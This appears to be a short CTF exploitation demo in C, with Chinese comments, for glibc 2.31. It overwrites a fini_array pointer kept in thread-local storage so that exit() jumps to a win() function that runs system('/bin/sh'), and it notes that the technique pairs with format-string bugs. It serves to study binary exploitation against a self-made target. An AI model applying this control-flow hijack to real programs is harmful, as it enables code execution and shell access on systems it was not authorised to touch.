// glibc: 2.31
// gcc simple.c -o simple -no-pie -ggdb
// 重要: stack 會殘留 FINI_ARRAY_IN_TLS 的位址 !!! (可以搭配 fsb, e.g. pwnable.tw printable)

#include <stdio.h>
#include <stdlib.h>

#define EXIT_OFFSET              (0x49bc0)
#define TLS_OFFSET               (0x247000)
#define FINI_ARRAY_OFFSET_IN_TLS (0x190)     /* by gdb */
#define FINI_ARRAY_ADDR          (0x403e10)


void win()
{
    system("/bin/sh");
}

void *ptr = win;

int main()
{
    int64_t libc_base = exit - EXIT_OFFSET;
    int64_t *target = libc_base + TLS_OFFSET + FINI_ARRAY_OFFSET_IN_TLS;
    *target = &ptr-FINI_ARRAY_ADDR/8;
    exit(0);
}


/*
   TLS:
   0x7ffff7fe0f49                  dec    DWORD PTR [rbp+r9*4+0x34]
   0x7ffff7fe0f4e                  mov    BYTE PTR [rbp+0xf1574d2], 0x1f
   0x7ffff7fe0f55                  add    BYTE PTR [rax], r8b
 → 0x7ffff7fe0f58                  call   QWORD PTR [r14]
   0x7ffff7fe0f5b                  mov    rdx, r14
   0x7ffff7fe0f5e                  sub    r14, 0x8
   0x7ffff7fe0f62                  cmp    QWORD PTR [rbp-0x38], rdx
   0x7ffff7fe0f66                  jne    0x7ffff7fe0f58
   0x7ffff7fe0f68                  mov    rax, QWORD PTR [r15+0xa8]
*/
